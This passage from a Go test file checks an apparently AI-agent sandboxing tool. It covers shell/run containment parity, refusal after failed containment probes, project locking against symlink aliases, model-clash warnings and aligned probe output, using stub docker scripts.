	if !slices.ContainsFunc(volumes, func(v sandbox.Volume) bool { return v.Target == sandbox.Workspace+"/"+projectimage.File && v.ReadOnly }) {
		t.Errorf("%s is not mounted read-only: %+v", projectimage.File, volumes)
	}
}

// Shell changes only the command: the selected agent's config/state, probes,
// dependency mounts, gateway key and hardening stay identical to run.
func TestShellMatchesRun(t *testing.T) {
	for _, name := range []string{"opencode", "pi"} {
		t.Run(name, func(t *testing.T) {
			project := fakeHome(t, map[string]string{
				"package.json": "{}", ".env": "SECRET=1\n",
			})
			t.Setenv("KOTA_GATEWAY_KEY", "shell-test-key")
			t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
			reference := t.TempDir()
			sa := sessionArgs{agent: name, gatewayURL: defaultGateway, dir: project, ro: []string{reference}}
			run, err := prepareTestSession(sa, sandbox.ModeRun)
			if err != nil {
				t.Fatal(err)
			}
			// Save the spec before cleanup removes protection placeholders.
			runSpec, runExpect, runDir := run.spec, run.expect, run.sessionDir
			run.cleanup()
			sa.shell = true
			shell, err := prepareTestSession(sa, sandbox.ModeRun)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(shell.cleanup)
			agent := shell.spec.Services[sandbox.AgentService]
			if !slices.Equal(agent.Command, []string{"bash", "--noprofile", "--norc", "-i"}) {
				t.Fatalf("shell command = %q", agent.Command)
			}
			if agent.User != fmt.Sprintf("%d:%d", os.Getuid(), os.Getgid()) || agent.WorkingDir != sandbox.Workspace || !agent.StdinOpen || !agent.Tty {
				t.Errorf("shell must be interactive in workspace as host UID/GID: %+v", agent)
			}
			agent.Command = runSpec.Services[sandbox.AgentService].Command
			shell.spec.Services[sandbox.AgentService] = agent
			// Session directories are unique; normalize only that host prefix.
			want, _ := json.Marshal(runSpec)
			got, _ := json.Marshal(shell.spec)
			got = []byte(strings.ReplaceAll(string(got), shell.sessionDir, runDir))
			if string(got) != string(want) {
				t.Errorf("shell spec differs beyond command:\ngot %s\nwant %s", got, want)
			}
			if !reflect.DeepEqual(shell.expect, runExpect) || shell.gateway != run.gateway || shell.gatewayKey != run.gatewayKey {
				t.Error("shell containment inputs differ from run")
			}
		})
	}
}

func TestShellRefusesFailedProbes(t *testing.T) {
	project := fakeHome(t, map[string]string{"README.md": "test"})
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	bin := t.TempDir()
	entered := filepath.Join(bin, "entered")
	t.Setenv("TEST_SHELL_ENTERED", entered)
	// Model discovery succeeds, but the probe container returns no results.
	// Missing probes must prevent the interactive container from starting.
	script := `#!/bin/sh
case "$*" in
  *wget*) printf '%s\n' '{"data":[{"id":"qwen3.6-coder"},{"id":"qwen3.5-2b-instruct"}]}' ;;
  *'run --rm agent') touch "$TEST_SHELL_ENTERED" ;;
esac
`
	if err := os.WriteFile(filepath.Join(bin, "docker"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	err := cmdShell([]string{project})
	if err == nil || !strings.Contains(err.Error(), "containment probes failed") {
		t.Fatalf("shell error = %v, want failed containment probes", err)
	}
	if _, err := os.Stat(entered); !os.IsNotExist(err) {
		t.Fatalf("interactive container started after failed probes: %v", err)
	}
	if _, err := os.Stat(filepath.Join(project, ".envrc")); !os.IsNotExist(err) {
		t.Errorf("protection placeholder left behind: %v", err)
	}
}

func TestShellRejectsRunOnlyOptions(t *testing.T) {
	for _, args := range [][]string{{"--auto"}, {"--unsafe-skip-check"}, {"--", "echo", "hi"}, {"a", "b"}} {
		if err := cmdShell(args); err == nil {
			t.Errorf("shell accepted %q", args)
		}
	}
}

func TestCommandsRefuseBusyProjectBeforePreparation(t *testing.T) {
	project := fakeHome(t, map[string]string{"package.json": "{}"})
	sa := sessionArgs{agent: agent.Default, gatewayURL: defaultGateway, dir: project}
	lease, err := lockProject(sa, "run")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { releaseProject(lease) })
	for _, command := range []struct {
		name string
		run  func([]string) error
	}{{"run", cmdRun}, {"shell", cmdShell}, {"prep", cmdPrep}, {"check", cmdCheck}} {
		t.Run(command.name, func(t *testing.T) {
			err := command.run([]string{project})
			var busy *sessionregistry.Busy
			if !errors.As(err, &busy) || busy.Session.Agent != "run (opencode)" {
				t.Fatalf("command error = %v, want existing run session", err)
			}
			if _, err := os.Stat(filepath.Join(project, ".envrc")); !os.IsNotExist(err) {
				t.Fatalf("busy command prepared mount placeholders: %v", err)
			}
		})
	}
	alias := project + "-alias"
	if err := os.Symlink(project, alias); err != nil {
		t.Fatal(err)
	}
	if err := cmdRun([]string{alias}); err == nil {
		t.Fatal("symlink alias bypassed project lock")
	}
	other := filepath.Join(filepath.Dir(project), "other")
	if err := os.Mkdir(other, 0o755); err != nil {
		t.Fatal(err)
	}
	sa.dir = other
	otherLease, err := lockProject(sa, "shell")
	if err != nil {
		t.Fatalf("different project refused: %v", err)
	}
	releaseProject(otherLease)
}

func TestStartupFailureReleasesProject(t *testing.T) {
	project := fakeHome(t, map[string]string{"README.md": "test"})
	if err := cmdRun([]string{"--agent", "unknown", project}); err == nil {
		t.Fatal("unknown agent accepted")
	}
	if err := cmdPrep([]string{project}); err == nil || !strings.Contains(err.Error(), "nothing to install") {
		t.Fatalf("prep error = %v", err)
	}
	lease, err := lockProject(sessionArgs{dir: project}, "run")
	if err != nil {
		t.Fatalf("startup error leaked lock: %v", err)
	}
	releaseProject(lease)
}

func TestRunWarnsOnDifferentSessionModel(t *testing.T) {
	project := fakeHome(t, map[string]string{"README.md": "test"})
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	other := filepath.Join(filepath.Dir(project), "other")
	if err := os.Mkdir(other, 0o755); err != nil {
		t.Fatal(err)
	}
	lease, err := lockProject(sessionArgs{dir: other, agent: "pi"}, "run")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { releaseProject(lease) })
	if _, err := lease.SetModel("model-a"); err != nil {
		t.Fatal(err)
	}
	bin := t.TempDir()
	script := `#!/bin/sh
case "$*" in
  *wget*) printf '%s\n' '{"data":[{"id":"model-a"},{"id":"model-b"}]}' ;;
esac
`
	if err := os.WriteFile(filepath.Join(bin, "docker"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	out, err := os.CreateTemp(t.TempDir(), "stderr")
	if err != nil {
		t.Fatal(err)
	}
	defer out.Close()
	stderr := os.Stderr
	os.Stderr = out
	defer func() { os.Stderr = stderr }()
	if err := cmdRun([]string{"--model", "model-b", "--unsafe-skip-check", project, "--", "true"}); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(out.Name())
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"model model-b differs from model-a", other, "run (pi)", "llama-swap will swap models back and forth"} {
		if !strings.Contains(string(data), want) {
			t.Errorf("startup output lacks %q: %s", want, data)
		}
	}
}

func TestLockedSessionKeepsResolvedPaths(t *testing.T) {
	project := fakeHome(t, map[string]string{"README.md": "a"})
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	other := filepath.Join(filepath.Dir(project), "other")
	if err := os.Mkdir(other, 0o755); err != nil {
		t.Fatal(err)
	}
	alias := project + "-alias"
	if err := os.Symlink(project, alias); err != nil {
		t.Fatal(err)
	}
	refA, refB := t.TempDir(), t.TempDir()
	refAlias := filepath.Join(t.TempDir(), "reference")
	if err := os.Symlink(refA, refAlias); err != nil {
		t.Fatal(err)
	}
	sa := sessionArgs{agent: agent.Default, gatewayURL: defaultGateway, dir: alias, ro: []string{refAlias}}
	lease, err := lockProject(sa, "run")
	if err != nil {
		t.Fatal(err)
	}
	defer releaseProject(lease)
	// Retarget both original arguments after taking the lease. Preparation
	// must use the validated paths that the lease actually covers.
	for alias, target := range map[string]string{alias: other, refAlias: refB} {
		if err := os.Remove(alias); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(target, alias); err != nil {
			t.Fatal(err)
		}
	}
	otherLease, err := lockProject(sessionArgs{dir: other}, "shell")
	if err != nil {
		t.Fatal(err)
	}
	defer releaseProject(otherLease)
	sess, err := prepareSession(sa, sandbox.ModeRun, lease.paths, lease.paths.Project, deps.Plan{})
	if err != nil {
		t.Fatal(err)
	}
	defer sess.cleanup()
	if sess.project != project || sess.spec.Name != sandbox.ProjectName(project) {
		t.Errorf("lease covers %s, but prepared project %s (%s)", project, sess.project, sess.spec.Name)
	}
	refA, err = filepath.EvalSymlinks(refA)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, mount := range sess.spec.Services[sandbox.AgentService].Volumes {
		if mount.Source == refA && mount.ReadOnly {
			found = true
		}
	}
	if !found {
		t.Error("preparation resolved the read-only alias again")
	}
}

func TestRunContinuesAfterModelWarningFailure(t *testing.T) {
	project := fakeHome(t, map[string]string{"README.md": "test"})
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	cache, err := os.UserCacheDir()
	if err != nil {
		t.Fatal(err)
	}
	// Opening a directory read-write fails deterministically, including
	// when tests run as root. Only the advisory registry scan touches it.
	if err := os.MkdirAll(filepath.Join(cache, "kota", "registry", "unreadable.lock"), 0o700); err != nil {
		t.Fatal(err)
	}
	bin := t.TempDir()
	entered := filepath.Join(bin, "entered")
	t.Setenv("TEST_RUN_ENTERED", entered)
	script := `#!/bin/sh
case "$*" in
  *wget*) printf '%s\n' '{"data":[{"id":"qwen3.6-coder"}]}' ;;
  *'run --rm agent') touch "$TEST_RUN_ENTERED" ;;
esac
`
	if err := os.WriteFile(filepath.Join(bin, "docker"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	out, err := os.CreateTemp(t.TempDir(), "stderr")
	if err != nil {
		t.Fatal(err)
	}
	defer out.Close()
	stderr := os.Stderr
	os.Stderr = out
	defer func() { os.Stderr = stderr }()
	if err := cmdRun([]string{"--unsafe-skip-check", project, "--", "true"}); err != nil {
		t.Errorf("advisory model scan aborted run: %v", err)
	}
	if _, err := os.Stat(entered); err != nil {
		t.Errorf("interactive command wasn't started: %v", err)
	}
	data, err := os.ReadFile(out.Name())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), "WARNING: could not check for model clashes:") {
		t.Errorf("missing model scan warning: %s", data)
	}
}

// TestPrintResultsAligned checks that the expectation column starts at the
// same place on every row, for the longest current probe names.
func TestPrintResultsAligned(t *testing.T) {
	probes := probe.Suite(probe.Targets{
		GatewayURL:  "http://gateway:8080",
		GatewayHost: "gateway",
		GatewayPort: 8080,
		HostAddrs:   []string{"192.168.5.2"},
		HostPorts:   []int{8080},
		Workspace:   "/workspace",
		ReadOnly:    []string{"/workspace/.kotaignore", "/etc/kota/opencode.json"},
		Masked:      []string{"/workspace/.env"},
		State:       "/home/agent/.local/share/opencode",
	})
	var results []probe.Result
	for _, p := range probes {
		results = append(results, probe.Result{Probe: p, ExitCode: 1})
	}
	var out strings.Builder
	printResults(&out, results)
	col := -1
	for _, line := range strings.Split(strings.TrimRight(out.String(), "\n"), "\n") {
		i := strings.Index(line, " must ")
		if i < 0 {
			t.Fatalf("no expectation column in %q", line)
		}
		if col < 0 {
			col = i
		} else if i != col {
			t.Errorf("expectation column at %d, want %d:\n%s", i, col, out.String())
			break
		}
	}
	if !strings.Contains(out.String(), "internet [2606:4700:4700::1111]:443") {
		t.Errorf("long probe name missing from output:\n%s", out.String())
	}
}
